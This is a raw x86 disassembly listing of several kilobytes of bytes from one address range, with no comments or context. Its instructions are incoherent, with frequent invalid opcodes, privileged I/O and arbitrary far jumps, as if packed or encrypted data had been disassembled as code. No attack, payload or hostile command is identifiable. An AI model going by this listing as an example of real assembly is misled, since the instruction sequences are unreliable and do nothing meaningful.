  41803e:	mov    al,0xdd
  418040:	mov    edx,0x36e672df
  418045:	xor    dl,BYTE PTR [esi]
  418047:	jle    0x41803e
  418049:	jmp    FWORD PTR [ebp+ebp*1-0x610f86e5]
  418050:	adc    eax,DWORD PTR [eax-0x18ae4ba8]
  418056:	mov    ds:0x508f27f1,al
  41805b:	pop    edi
  41805c:	aam    0x4b
  41805e:	jge    0x418005
  418060:	pop    esi
  418061:	cmp    ebp,ebx
  418063:	jno    0x4180a3
  418065:	aas    
  418066:	inc    edi
  418067:	loopne 0x4180b3
  418069:	(bad)  
  41806a:	cmp    BYTE PTR [ebx-0x43],al
  41806d:	pop    es
  41806e:	in     al,0xd
  418070:	pop    esi
  418071:	mov    esp,0x1095a3f6
  418076:	adc    bh,BYTE PTR [esi-0x2814d68c]
  41807c:	sub    al,0xf0
  41807e:	sub    DWORD PTR [eax+0x4a9ab9d2],0x8b9dca1b
  418088:	loop   0x418051
  41808a:	push   cs
  41808b:	cdq    
  41808c:	aam    0x44
  41808e:	int    0x51
  418090:	or     edi,0x56
  418093:	add    al,0x33
  418095:	add    DWORD PTR [esp+ebp*2],edi
  418098:	jmp    0x7068:0xd4ab1d31
  41809f:	stc    
  4180a0:	dec    ecx
  4180a1:	mov    al,0x21
  4180a3:	sbb    DWORD PTR [esi+ecx*8+0x5437dd07],ebp
  4180aa:	rcr    DWORD PTR [edx],cl
  4180ac:	jp     0x418090
  4180ae:	stc    
  4180af:	xlat   BYTE PTR ds:[ebx]
  4180b0:	fcom   QWORD PTR [ecx]
  4180b2:	sbb    edi,edx
  4180b4:	sti    
  4180b5:	fnstsw WORD PTR [ecx+0x5e]
  4180b8:	ret    0x323
  4180bb:	outs   dx,DWORD PTR ds:[esi]
  4180bc:	xor    eax,0x6a48c407
  4180c1:	xchg   esi,eax
  4180c2:	sbb    DWORD PTR [edi-0x78],eax
  4180c5:	sti    
  4180c6:	inc    ecx
  4180c7:	int3   
  4180c8:	shl    BYTE PTR [esi-0x116ea74c],1
  4180ce:	ja     0x41814d
  4180d0:	retf   
  4180d1:	ja     0x4180ce
  4180d3:	mov    al,ds:0x7d56f3db
  4180d8:	pop    ecx
  4180d9:	pop    ebp
  4180da:	mov    edx,0x403ef804
  4180df:	popa   
  4180e0:	add    DWORD PTR gs:[edi+0x6215b509],edi
  4180e7:	mov    eax,0xe6dea155
  4180ec:	lock xchg esp,eax
  4180ee:	cmovb  edx,DWORD PTR [ebp+0x13]
  4180f2:	scas   al,BYTE PTR es:[edi]
  4180f3:	stos   DWORD PTR es:[edi],eax
  4180f4:	cmp    ecx,DWORD PTR ds:0xb042252c
  4180fa:	and    esi,DWORD PTR [ebx]
  4180fc:	sub    DWORD PTR [ebp-0x15],0x73
  418100:	loopne 0x41814b
  418102:	mov    esi,0x84db8728
  418107:	lds    eax,FWORD PTR [eax-0x3b549d1c]
  41810d:	push   edx
  41810e:	jno    0x418164
  418110:	adc    esp,DWORD PTR [ebp+0x4770c8aa]
  418116:	lahf   
  418117:	mov    edx,0x26121cc2
  41811c:	sbb    BYTE PTR [edi-0x4f],0x4
  418120:	push   edx
  418121:	xor    BYTE PTR [ebp+0x5d8fc8f0],al
  418127:	mov    ds:0x5b69d5ec,eax
  41812c:	idiv   BYTE PTR [ecx+0x4fc03dcf]
  418132:	mov    eax,0x1e304968
  418137:	mov    ch,0xf4
  418139:	adc    edx,esi
  41813b:	pop    esp
  41813c:	jbe    0x41814f
  41813e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41813f:	(bad)  
  418140:	cmp    eax,0x9043f45e
  418145:	ss mov bl,0x63
  418148:	shl    DWORD PTR [edi+ebx*4],1
  41814b:	mov    DWORD PTR [ebx],esp
  41814d:	lods   al,BYTE PTR ds:[esi]
  41814e:	push   ebx
  41814f:	test   al,0x62
  418151:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418152:	das    
  418153:	out    0xda,eax
  418155:	shr    al,cl
  418157:	or     esi,DWORD PTR [edx+0x6baa7868]
  41815d:	add    dh,BYTE PTR [ebx+eiz*4-0x478ea91a]
  418164:	sub    eax,0xd02f95b4
  418169:	call   0xaf38:0xf70070b2
  418170:	cli    
  418171:	xchg   edi,eax
  418172:	div    DWORD PTR [ebx+0x65]
  418175:	std    
  418176:	std    
  418177:	pop    ss
  418178:	jl     0x418160
  41817a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41817b:	inc    esi
  41817c:	mov    eax,ds:0x827a8fbb
  418181:	sar    BYTE PTR [eax+0x7b],cl
  418184:	push   ds
  418185:	mov    esi,fs
  418187:	enter  0x597b,0x6b
  41818b:	add    eax,0x97d5fbb3
  418190:	fs pop edi
  418192:	push   ss
  418193:	and    edx,DWORD PTR [ebp+0x12]
  418196:	(bad)  
  418197:	pop    edx
  418198:	idiv   BYTE PTR [edi-0x7ef73826]
  41819e:	(bad)  
  41819f:	xchg   esp,eax
  4181a0:	neg    BYTE PTR [ebx-0x7]
  4181a3:	retf   0xaa4f
  4181a6:	sbb    eax,0xe7a12117
  4181ab:	loop   0x418209
  4181ad:	cli    
  4181ae:	xor    bh,BYTE PTR [edx-0x2a]
  4181b1:	aaa    
  4181b2:	adc    eax,0xe2308ff8
  4181b7:	or     edx,DWORD PTR [ebp+0x7e5c9a58]
  4181bd:	xor    dl,BYTE PTR [esp]
  4181c0:	inc    esp
  4181c1:	inc    edi
  4181c2:	cmc    
  4181c3:	add    al,0xf2
  4181c5:	push   esi
  4181c6:	mov    edx,edx
  4181c8:	das    
  4181c9:	jg     0x41817f
  4181cb:	jl     0x4181db
  4181cd:	mov    ah,0xee
  4181cf:	mov    cl,0xfb
  4181d1:	ja     0x4181d1
  4181d3:	clc    
  4181d4:	test   al,0x0
  4181d6:	ret    0x492f
  4181d9:	or     ecx,ebp
  4181db:	stos   BYTE PTR es:[edi],al
  4181dc:	and    al,0x79
  4181de:	rcr    DWORD PTR [edx],0x7d
  4181e1:	sub    edi,ebx
  4181e3:	stos   BYTE PTR es:[edi],al
  4181e4:	sar    BYTE PTR [edx],1
  4181e6:	scas   eax,DWORD PTR es:[edi]
  4181e7:	add    bl,BYTE PTR [esp+0x1e2e2b31]
  4181ee:	push   esp
  4181ef:	fisttp WORD PTR [ebx]
  4181f1:	inc    esi
  4181f2:	and    al,0xfe
  4181f4:	inc    edx
  4181f5:	xor    eax,0xafd16ba2
  4181fa:	jne    0x4181c6
  4181fc:	adc    cl,al
  4181fe:	jmp    0x853d:0x1b818ec
  418205:	mov    cl,BYTE PTR [eax]
  418207:	pop    eax
  418208:	test   eax,0xf2bcb17c
  41820d:	imul   eax,ebp,0x54662d0
  418213:	loopne 0x4181a6
  418215:	push   esi
  418216:	cdq    
  418217:	or     bh,BYTE PTR [edx]
  418219:	mov    eax,0xb7fd1fb
  41821e:	shr    BYTE PTR [eax-0x2826d843],1
  418224:	mov    bh,0x36
  418226:	aad    0x81
  418228:	pop    ss
  418229:	scas   al,BYTE PTR es:[edi]
  41822a:	data16 xor bh,al
  41822d:	lds    esp,FWORD PTR ds:[ebp-0x269116bb]
  418234:	in     al,dx
  418235:	mov    dh,0xc
  418237:	cmc    
  418238:	loopne 0x418278
  41823a:	mov    eax,ds:0x12044ee5
  41823f:	mov    esp,0xc2850642
  418244:	dec    ebp
  418245:	pop    es
  418246:	paddw  mm3,QWORD PTR [edx]
  418249:	add    dl,dh
  41824b:	pushf  
  41824c:	pop    edi
  41824d:	jns    0x4181d2
  41824f:	int3   
  418250:	inc    edx
  418251:	mov    al,ds:0x4a728a2b
  418256:	pop    esi
  418257:	push   ebx
  418258:	mov    edx,edi
  41825a:	pop    edx
  41825b:	jp     0x418238
  41825d:	add    eax,0xe7a70a38
  418262:	mov    edi,0xe5a432b3
  418267:	(bad)  
  418268:	lock and eax,ebp
  41826b:	ss jno 0x41822b
  41826e:	sar    dh,0x48
  418271:	scas   al,BYTE PTR es:[edi]
  418272:	aas    
  418273:	mov    dh,0x61
  418275:	test   al,0x67
  418277:	xor    DWORD PTR [eax-0x5d],esp
  41827a:	loope  0x418254
  41827c:	push   esp
  41827d:	stc    
  41827e:	jbe    0x41823b
  418280:	fnstcw WORD PTR [edi]
  418282:	(bad)  
  418283:	aam    0xa
  418285:	in     eax,0x62
  418287:	adc    BYTE PTR [ecx+0x36546863],ah
  41828d:	inc    esp
  41828e:	xor    ch,cl
  418290:	sti    
  418291:	sub    eax,0xc96df84a
  418296:	or     al,0x6a
  418298:	cdq    
  418299:	mov    esi,0x6ffe253e
  41829e:	out    0x86,eax
  4182a0:	cmp    BYTE PTR [edx+0x5fa2aed1],cl
  4182a6:	sbb    bh,dh
  4182a8:	fld    DWORD PTR [eax]
  4182aa:	cdq    
  4182ab:	sbb    DWORD PTR [eax+0x6],ebp
  4182ae:	test   eax,0x47456c23
  4182b3:	add    al,0xd5
  4182b5:	dec    edx
  4182b6:	jp     0x4182fe
  4182b8:	pop    edi
  4182b9:	pop    ecx
  4182ba:	mul    DWORD PTR [ecx]
  4182bc:	cwde   
  4182bd:	dec    edi
  4182be:	outs   dx,BYTE PTR ds:[esi]
  4182bf:	mov    bl,0x3d
  4182c1:	jo     0x4182e8
  4182c3:	sub    eax,0x3b5f98c8
  4182c8:	push   edi
  4182c9:	sub    ebp,DWORD PTR [edi+0x2d]
  4182cc:	adc    DWORD PTR [edx],eax
  4182ce:	pop    ss
  4182cf:	jge    0x4182ee
  4182d1:	push   ds
  4182d2:	mov    ds:0xbdf9b048,eax
  4182d7:	or     DWORD PTR [edi],ebp
  4182d9:	not    BYTE PTR [ebx-0x5b]
  4182dc:	jo     0x4182d2
  4182de:	jg     0x4182c5
  4182e0:	daa    
  4182e1:	dec    ecx
  4182e2:	jmp    0x41826b
  4182e4:	sub    al,0xff
  4182e6:	cmp    al,0xa
  4182e8:	lahf   
  4182e9:	mov    edx,esi
  4182eb:	inc    edx
  4182ec:	pop    edx
  4182ed:	push   ecx
  4182ee:	jo     0x41832e
  4182f0:	pop    esp
  4182f1:	cwde   
  4182f2:	jecxz  0x418350
  4182f4:	inc    edx
  4182f5:	mov    bh,0x7a
  4182f7:	inc    esp
  4182f8:	popa   
  4182f9:	sahf   
  4182fa:	jmp    0x5936:0x734c90f3
  418301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418302:	xchg   BYTE PTR [ebp+ebx*1-0x1882203d],al
  418309:	dec    ebx
  41830a:	push   eax
  41830b:	call   0x56cc24a0
  418310:	nop
  418311:	out    0x42,eax
  418313:	push   ss
  418314:	jmp    0x4182db
  418316:	pop    ss
  418317:	ret    0x45fe
  41831a:	and    eax,0x703d0ed1
  41831f:	retf   
  418320:	pushf  
  418321:	adc    ah,bl
  418323:	sbb    BYTE PTR [eax-0x10],al
  418326:	ret    0x2f3c
  418329:	out    dx,al
  41832a:	sbb    BYTE PTR [esi-0x9],dh
  41832d:	in     eax,0x89
  41832f:	dec    ebp
  418330:	out    0x9b,eax
  418332:	cmp    eax,0x51fda363
  418337:	inc    esp
  418338:	dec    DWORD PTR [ebp+eax*8-0x45]
  41833c:	leave  
  41833d:	fcmove st,st(0)
  41833f:	jmp    0x418345
  418341:	cwde   
  418342:	or     eax,0x1c0beed6
  418347:	ret    
  418348:	jmp    0xe1b77983
  41834d:	ja     0x418362
  41834f:	pop    esp
  418350:	jmp    0xda1d9501
  418355:	call   0x2ea01a4
  41835a:	push   ds
  41835b:	mov    eax,ecx
  41835d:	sahf   
  41835e:	xchg   ebp,esp
  418360:	aas    
  418361:	fucomp st(0)
  418363:	repz pop edi
  418365:	loopne 0x41836a
  418367:	fs aad 0x6c
  41836a:	scas   eax,DWORD PTR es:[edi]
  41836b:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  41836d:	push   ecx
  41836e:	jb     0x418337
  418370:	scas   eax,DWORD PTR es:[edi]
  418371:	fimul  DWORD PTR [esi-0x65]
  418374:	inc    edx
  418375:	test   DWORD PTR [edi-0x15f7f3ed],edx
  41837b:	and    DWORD PTR ds:0x6dc67389,edi
  418381:	sub    dh,BYTE PTR [esi-0x3f]
  418384:	lds    ebx,FWORD PTR [edi+0x48]
  418387:	pushf  
  418388:	test   eax,0xf5ee701a
  41838d:	pop    esp
  41838e:	(bad)  
  41838f:	sti    
  418390:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418391:	add    eax,0xa047cc2
  418396:	loope  0x41833e
  418398:	pop    ss
  418399:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41839a:	pop    ebx
  41839b:	or     al,0x69
  41839d:	inc    esi
  41839e:	pop    ecx
  41839f:	fcomi  st,st(2)
  4183a1:	stc    
  4183a2:	cmp    ah,BYTE PTR [ecx-0x52]
  4183a5:	jmp    DWORD PTR [edx]
  4183a7:	jmp    0x41835b
  4183a9:	aaa    
  4183aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ab:	ss cmp eax,0x75ccd344
  4183b1:	and    DWORD PTR [esi+0x2a],eax
  4183b4:	sub    esi,ebx
  4183b6:	addr16 push ebx
  4183b8:	lahf   
  4183b9:	rsm    
  4183bb:	jno    0x41838c
  4183bd:	and    ch,dh
  4183bf:	cmp    edx,DWORD PTR [ebx-0x29479cb4]
  4183c5:	push   ds
  4183c6:	test   eax,0x4473b832
  4183cb:	out    dx,al
  4183cc:	(bad)  
  4183cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ce:	dec    esp
  4183cf:	scas   eax,DWORD PTR es:[edi]
  4183d0:	cli    
  4183d1:	hlt    
  4183d2:	test   bl,0xa7
  4183d5:	call   FWORD PTR [eax+0x4e]
  4183d8:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  4183da:	dec    edx
  4183db:	addr16 xchg esp,eax
  4183dd:	dec    eax
  4183de:	pop    eax
  4183df:	xchg   esp,eax
  4183e0:	inc    ecx
  4183e1:	jg     0x418406
  4183e3:	mov    ?,WORD PTR [ebx]
  4183e5:	or     DWORD PTR [edx-0x1fedb0fa],0x84d06454
  4183ef:	(bad)  
  4183f0:	out    0xc7,eax
  4183f2:	aad    0xcc
  4183f4:	shr    edx,1
  4183f6:	aaa    
  4183f7:	(bad)  
  4183f8:	in     al,dx
  4183f9:	ins    DWORD PTR es:[edi],dx
  4183fa:	scas   al,BYTE PTR es:[edi]
  4183fb:	xor    eax,0x9cfe0886
  418400:	sti    
  418401:	cwde   
  418402:	pop    esp
  418403:	sbb    al,0x62
  418405:	sbb    ebx,DWORD PTR [esi]
  418407:	in     al,0x37
  418409:	adc    al,0x6a
  41840b:	xor    eax,0x715a52ae
  418410:	xchg   esi,eax
  418411:	bound  ebx,QWORD PTR ds:0x86ca9705
  418417:	loope  0x41839c
  418419:	pop    eax
  41841a:	push   0xdfe93e4
  41841f:	and    al,0x19
  418421:	mov    es:0xe2d4e507,al
  418427:	cmp    bl,cl
  418429:	or     al,0xc1
  41842b:	aaa    
  41842c:	adc    dl,BYTE PTR [edi+ecx*2+0x73]
  418430:	xchg   esi,eax
  418431:	hlt    
  418432:	and    esi,DWORD PTR [esi-0x78]
  418435:	paddusb mm2,mm0
  418438:	sub    eax,0xadf6f8d4
  41843d:	adc    esp,ebp
  41843f:	fisttp DWORD PTR [edi+0x8]
  418442:	xchg   BYTE PTR [ecx+0x5882f142],cl
  418448:	jbe    0x4183f9
  41844a:	adc    dl,BYTE PTR [esi]
  41844c:	jle    0x418479
  41844e:	repz dec ebx
  418450:	add    dh,cl
  418452:	or     bh,BYTE PTR [edi-0x20]
  418455:	dec    edi
  418456:	add    eax,edx
  418458:	push   ebx
  41845a:	mov    DWORD PTR [ebx],0x4c46013f
  418460:	pop    edi
  418461:	lock sub bh,ah
  418464:	arpl   WORD PTR [ecx-0x6e5d7a79],di
  41846a:	cmp    al,0x81
  41846c:	inc    DWORD PTR [esi-0x575be24]
  418472:	mov    BYTE PTR [eax],al
  418474:	loop   0x4184e1
  418476:	xchg   edx,eax
  418477:	sub    ebx,DWORD PTR [esi]
  418479:	clc    
  41847a:	mov    dl,0xe4
  41847c:	je     0x4184c8
  41847e:	iret   
  41847f:	icebp  
  418480:	xchg   edi,eax
  418481:	mov    ds:0xa705fe0a,al
  418486:	jns    0x4184a7
  418488:	mov    ebx,0xcc199d8f
  41848d:	and    ah,cl
  41848f:	jl     0x41846b
  418491:	and    BYTE PTR [ecx+0x29],al
  418494:	xchg   edx,eax
  418495:	adc    ch,BYTE PTR [ecx-0x17]
  418498:	sub    bl,0x5d
  41849b:	xchg   esp,eax
  41849c:	xchg   esi,eax
  41849d:	fimul  WORD PTR [ebp-0x20]
  4184a0:	(bad)  
  4184a2:	push   esi
  4184a3:	jb     0x4184ff
  4184a5:	sbb    eax,0xb6d198cf
  4184aa:	mov    DWORD PTR [edx],0x5b261ca2
  4184b0:	out    0xac,al
  4184b2:	rcl    DWORD PTR [edx],1
  4184b4:	mov    esp,0x7e5123d8
  4184b9:	xchg   ecx,eax
  4184ba:	cmp    DWORD PTR [esi-0x66067eef],esi
  4184c0:	cmp    ecx,DWORD PTR [esi]
  4184c2:	pop    ebp
  4184c3:	mov    dh,0x56
  4184c5:	inc    edi
  4184c6:	stos   BYTE PTR es:[edi],al
  4184c7:	les    esp,FWORD PTR [edx+0x31afd7fa]
  4184cd:	icebp  
  4184ce:	push   0x29
  4184d0:	cmp    eax,0xf5217319
  4184d5:	sbb    al,dl
  4184d7:	xor    edx,edi
  4184d9:	push   edi
  4184da:	or     al,0x17
  4184dc:	jae    0x4184de
  4184de:	mov    eax,0x8dbde841
  4184e3:	pop    edi
  4184e4:	dec    ebp
  4184e5:	(bad)  
  4184e6:	cmp    DWORD PTR [edi],ecx
  4184e8:	dec    ebp
  4184e9:	es iret 
  4184eb:	push   ebp
  4184ec:	adc    al,0x53
  4184ee:	cwde   
  4184ef:	mov    ah,0x4c
  4184f1:	mov    ebx,0xe90ad6d4
  4184f6:	mov    ss,WORD PTR [eax+0x666a9c99]
  4184fc:	out    0xc9,eax
  4184fe:	xor    esi,DWORD PTR [ecx-0x7e]
  418501:	test   eax,0x969e1f3e
  418506:	add    DWORD PTR [ecx],edi
  418508:	mov    edi,DWORD PTR [eax+ebx*2-0x4acfdbaf]
  41850f:	pop    DWORD PTR [ebp-0x68cf0785]
  418515:	mov    edx,0xcf86fb63
  41851a:	cmp    dh,BYTE PTR [eax]
  41851c:	mov    eax,0x49ccb09c
  418521:	adc    dh,dl
  418523:	shl    DWORD PTR [ebx],cl
  418525:	(bad)  
  418526:	(bad)  
  418527:	xchg   esp,eax
  418528:	cmp    esi,DWORD PTR [ebx-0x7c]
  41852b:	in     eax,0x9c
  41852d:	jb     0x4184c5
  41852f:	push   ss
  418530:	dec    esp
  418531:	shl    dl,1
  418533:	nop
  418534:	nop
  418535:	test   DWORD PTR [edx+0x4],edi
  418538:	in     al,dx
  418539:	out    dx,eax
  41853a:	mov    esp,DWORD PTR [ecx]
  41853c:	dec    ecx
  41853d:	dec    esi
  41853f:	jo     0x4184ff
  418541:	pop    ebp
  418543:	cli    
  418544:	dec    ebx
  418545:	add    ch,BYTE PTR [eax-0x3c]
  418548:	mov    dh,0x6a
  41854a:	ret    
  41854b:	mov    cl,0x9e
  41854d:	push   eax
  41854e:	push   ebp
  41854f:	fimul  DWORD PTR ds:0xffa0984a
  418555:	retf   
  418556:	xor    ecx,DWORD PTR [edx-0x169948be]
  41855c:	imul   esi,ebp,0x12
  41855f:	and    al,0xb9
  418561:	loope  0x418577
  418563:	popw   ds
  418565:	sub    cl,BYTE PTR [eax-0x6849b6b5]
  41856b:	dec    ecx
  41856c:	pusha  
  41856d:	ins    DWORD PTR es:[edi],dx
  41856e:	dec    ebx
  41856f:	push   edi
  418570:	xor    eax,0x423884f3
  418575:	les    ebx,FWORD PTR cs:[edi+0x9b86ea2]
  41857c:	sub    bh,ah
  41857e:	rol    esi,0x90
  418581:	dec    edi
  418582:	add    BYTE PTR [ebx+0x28],0xc3
  418586:	jmp    0x418513
  418588:	mov    ebp,0xeae2615a
  41858d:	or     ch,BYTE PTR [esi+0x223a32c3]
  418593:	data16 mov al,ds:0x4b28a604
  418599:	add    eax,0xaa25675b
  41859e:	mov    ebp,0xb52e8814
  4185a3:	dec    ecx
  4185a4:	jle    0x41860d
  4185a6:	cmp    al,0xe8
  4185a8:	int3   
  4185a9:	xchg   edx,eax
  4185aa:	outs   dx,DWORD PTR ds:[esi]
  4185ab:	add    BYTE PTR [ecx-0x32],ah
  4185ae:	mov    eax,ds:0x47ffec79
  4185b3:	inc    edx
  4185b4:	adc    edx,ebx
  4185b6:	mov    bh,ch
  4185b8:	sub    ch,BYTE PTR [eax]
  4185ba:	cmp    eax,0x4df91b1c
  4185bf:	inc    edi
  4185c0:	push   eax
  4185c1:	dec    ebp
  4185c2:	jbe    0x4185f8
  4185c4:	or     DWORD PTR [eax+0x117cb1a1],esp
  4185ca:	sub    eax,0xf7d66235
  4185cf:	add    al,0x46
  4185d1:	mov    cl,bh
  4185d3:	pusha  
  4185d4:	in     eax,dx
  4185d5:	loope  0x4185d6
  4185d7:	mov    bl,0xf7
  4185d9:	dec    esp
  4185da:	outs   dx,BYTE PTR ds:[esi]
  4185db:	arpl   WORD PTR [edx],cx
  4185dd:	inc    esi
  4185de:	popf   
  4185df:	cmp    DWORD PTR [ebp-0x70],esp
  4185e2:	jo     0x41863b
  4185e4:	out    dx,al
  4185e5:	push   0x3455cb33
  4185ea:	mov    ds:0xd06f5505,al
  4185ef:	push   ss
  4185f0:	cmp    ah,BYTE PTR [ebp+esi*8+0x35]
  4185f4:	mov    dh,0xd2
  4185f6:	lahf   
  4185f7:	inc    eax
  4185f8:	and    ebp,DWORD PTR [ecx+0x4a6f8c5]
  4185fe:	mov    WORD PTR [ebx],cs
  418600:	call   0x348c19ab
  418605:	jmp    0xc8ac:0x19352dbd
  41860c:	or     eax,0x2dec6db
  418611:	mov    ds:0xf0160ab9,eax
  418616:	xor    eax,0x624369d9
  41861b:	sub    DWORD PTR [ecx-0x58b93881],eax
  418621:	adc    dh,dl
  418623:	clc    
  418624:	stc    
  418625:	adc    eax,0x93fda3ea
  41862a:	aaa    
  41862b:	ds or  al,0x9
  41862e:	arpl   WORD PTR [ebx],bp
  418630:	mov    WORD PTR [ecx],fs
  418632:	lock ret 0x12d0
  418636:	add    BYTE PTR [esi+0x42be6ee0],al
  41863c:	add    al,0x10
  41863e:	dec    ecx
  41863f:	repnz fisttp WORD PTR [esi+0x4c3ee8a]
  418646:	jmp    0x52bd:0x3cf2f0b6
  41864d:	outs   dx,DWORD PTR ds:[esi]
  41864e:	pop    es
  41864f:	in     eax,dx
  418650:	dec    ebx
  418651:	imul   ecx,DWORD PTR [esi+0xf],0xf3a1447a
  418658:	or     DWORD PTR [ebp+0x7e],ebp
  41865b:	and    al,BYTE PTR [edx+0x45400889]
  418661:	jge    0x4186cd
  418663:	ror    DWORD PTR [ebx-0x391d05c8],1
  418669:	push   esp
  41866a:	xor    eax,0xe93be4e9
  41866f:	lahf   
  418670:	(bad)  
  418671:	cmp    BYTE PTR [ebp+0x43],cl
  418674:	mov    eax,ebp
  418676:	rcr    DWORD PTR ds:0x1fcabc57,cl
  41867c:	mov    esi,DWORD PTR [edx]
  41867e:	jo     0x418630
  418680:	loopne 0x418617
  418682:	xchg   ecx,eax
  418683:	addr16 js 0x41861a
  418686:	cs aaa 
  418688:	test   DWORD PTR [ebx],0xa35fc053
  41868e:	sti    
  41868f:	adc    al,0xdf
  418691:	sbb    BYTE PTR [edx+eax*4+0xd5a818c],al
  418698:	leave  
  418699:	xor    al,0xf2
  41869b:	adc    eax,0x2d48a91
  4186a0:	xor    BYTE PTR [ebx],dh
  4186a2:	test   eax,0x95acff3d
  4186a7:	mov    DWORD PTR [ebx-0x30],eax
  4186aa:	and    edx,DWORD PTR [edi-0xb3dea53]
  4186b0:	and    DWORD PTR [ecx-0x68],esi
  4186b3:	pop    ecx
  4186b4:	out    dx,al
  4186b5:	sti    
  4186b6:	jne    0x4186b3
  4186b8:	push   edi
  4186b9:	stc    
  4186ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4186bb:	das    
  4186bc:	sub    ecx,DWORD PTR [esi+0x2d]
  4186bf:	mov    edx,0x294001a8
  4186c4:	jle    0x4186a7
  4186c6:	je     0x41869e
  4186c8:	cmp    BYTE PTR [edi+edx*1-0x53],al
  4186cc:	push   esp
  4186cd:	adc    edx,DWORD PTR [ebp+0x54d36d68]
  4186d3:	cld    
  4186d4:	and    esp,ecx
  4186d6:	jle    0x4186ea
  4186d8:	daa    
  4186d9:	fdivrp st(6),st
  4186db:	popf   
  4186dc:	or     edx,esi
  4186de:	mov    ds:0x88e8f9b0,eax
  4186e3:	mov    ebx,0x968afab2
  4186e8:	(bad)  
  4186e9:	dec    edx
  4186ea:	xchg   esp,eax
  4186eb:	iret   
  4186ec:	test   eax,0x82134850
  4186f1:	fistp  WORD PTR ds:0x3c379b7d
  4186f7:	push   ss
  4186f8:	pop    es
  4186f9:	ss push ecx
  4186fb:	neg    DWORD PTR [ebx+eax*8]
  4186fe:	outs   dx,BYTE PTR ds:[esi]
  4186ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418700:	xor    BYTE PTR [edx-0x73cf8514],dh
  418706:	cmp    edx,DWORD PTR [edx+0x561d0c86]
  41870c:	test   DWORD PTR [edi-0x2726a6af],eax
  418712:	outs   dx,BYTE PTR ss:[esi]
  418714:	inc    ebx
  418715:	jns    0x418751
  418717:	jnp    0x418717
  418719:	ret    
  41871a:	jl     0x41873e
  41871c:	adc    DWORD PTR [esi-0x5df740e0],edx
  418722:	ins    DWORD PTR es:[edi],dx
  418723:	jne    0x4186ac
  418725:	jp     0x41871f
  418727:	pop    ebx
  418728:	pusha  
  418729:	xchg   esi,eax
  41872a:	ds aas 
  41872c:	mov    bh,0x12
  41872e:	mov    ah,0x83
  418730:	jnp    0x4186f2
  418732:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418733:	aas    
  418734:	lods   al,BYTE PTR ds:[esi]
  418735:	cld    
  418736:	out    0x23,eax
  418738:	ins    DWORD PTR es:[edi],dx
  418739:	js     0x418704
  41873b:	aaa    
  41873c:	push   ecx
  41873d:	jb     0x4187b5
  41873f:	iret   
  418740:	cdq    
  418741:	outs   dx,DWORD PTR ds:[esi]
  418742:	pop    ecx
  418743:	sbb    DWORD PTR [esi+0x33748a21],eax
  418749:	mov    ch,0xf7
  41874b:	cmp    BYTE PTR [ecx-0x68f89269],bh
  418751:	(bad)
  418755:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418756:	(bad)  
  418758:	pop    edx
  418759:	push   es
  41875a:	sahf   
  41875b:	mov    eax,ds:0xbc22b2be
  418760:	mov    esp,0x4a81e03d
  418765:	push   es
  418766:	in     al,0x98
  418768:	out    dx,al
  418769:	sub    al,0xc7
  41876b:	ins    BYTE PTR es:[edi],dx
  41876c:	push   edi
  41876d:	fwait
  41876e:	adc    bh,ah
  418770:	inc    ebp
  418771:	loopne 0x41871a
  418773:	in     eax,0x82
  418775:	pop    ecx
  418776:	ins    BYTE PTR es:[edi],dx
  418777:	cmp    BYTE PTR [ebx+0x30d05717],dl
  41877d:	inc    ecx
  41877e:	xor    esp,esi
  418780:	inc    ebp
  418781:	sbb    eax,0xc2f4e2bc
  418786:	sub    al,0xbb
  418788:	cwde   
  418789:	outs   dx,BYTE PTR ds:[esi]
  41878a:	push   ss
  41878b:	lock in al,0x99
  41878e:	mov    bl,bl
  418790:	or     al,ch
  418792:	mov    ebx,cs
  418794:	fimul  DWORD PTR [esi]
  418796:	repnz out 0x98,al
  418799:	arpl   dx,dx
  41879b:	test   DWORD PTR [eax-0x799c0a8f],ecx
  4187a1:	cmp    esi,edx
  4187a3:	jnp    0x41880c
  4187a5:	jmp    0x418814
  4187a7:	xor    BYTE PTR [eax],ah
  4187a9:	jne    0x122f4895
  4187af:	sub    eax,0xf04c135a
  4187b4:	jl     0x418826
  4187b6:	mov    ebx,0xd31e3132
  4187bb:	inc    esi
  4187bc:	out    0xa8,al
  4187be:	pop    es
  4187bf:	inc    edx
  4187c0:	mov    ecx,0x251c5b0b
  4187c5:	xchg   edx,eax
  4187c6:	lods   eax,DWORD PTR ds:[esi]
  4187c7:	les    ecx,FWORD PTR [ecx-0x1b8ad393]
  4187cd:	in     al,dx
  4187ce:	jl     0x41881e
  4187d0:	cmp    BYTE PTR [edi+0x50],ch
  4187d3:	cli    
  4187d4:	sub    DWORD PTR [ecx],esp
  4187d6:	mov    esp,0xa0551007
  4187db:	fucomi st,st(2)
  4187dd:	jl     0x418801
  4187df:	ficomp WORD PTR [ebx-0x44]
  4187e2:	pop    ss
  4187e3:	sar    DWORD PTR [ebx+0x73],1
  4187e6:	lea    ebp,[edx+0x24]
  4187e9:	pop    esp
  4187ea:	add    dl,BYTE PTR [esi-0x221d86fb]
  4187f0:	(bad)  
  4187f1:	fdivr  QWORD PTR [ecx+esi*8+0x37]
  4187f5:	inc    BYTE PTR [esi]
  4187f7:	and    al,0x4e
  4187f9:	add    ebx,0x67d441fd
  4187ff:	or     al,0x4e
  418801:	adc    al,BYTE PTR [ecx-0x691aaccb]
  418807:	fadd   QWORD PTR [ebx-0x55]
  41880a:	push   eax
  41880b:	into   
  41880c:	pushf  
  41880d:	jnp    0x418871
  41880f:	imul   ebx,DWORD PTR [edx],0x6a2b658a
  418815:	fdivr  DWORD PTR [ebp-0x63]
  418818:	clc    
  418819:	add    eax,0xad95d15d
  41881e:	test   eax,0xf8e06469
  418823:	add    eax,eax
  418825:	icebp  
  418826:	je     0x41888a
